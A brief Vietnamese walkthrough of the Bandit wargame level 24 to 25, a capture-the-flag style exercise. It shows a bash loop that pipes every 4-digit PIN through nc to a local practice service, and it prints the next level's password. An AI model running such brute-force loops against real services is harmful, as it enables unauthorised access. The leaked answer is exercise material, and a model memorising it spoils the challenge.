# Bandit 24 → 25

## Mục tiêu

brute-force PIN.

## Tôi thấy

PIN chỉ có 4 chữ số, nên tôi gửi 0000 đến 9999 trên cùng service.

## Cách làm

```bash
for pin in $(seq -w 0000 9999); do printf "%s %s\n" "$PASSWORD" "$pin"; done | nc localhost 30002
```

## Vì sao cách này hiệu quả

Đề cho phép thử liên tiếp mà không cần mở connection mới.

## Kết quả

Password của `bandit25` trong phiên đã xác minh là:

```text
SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

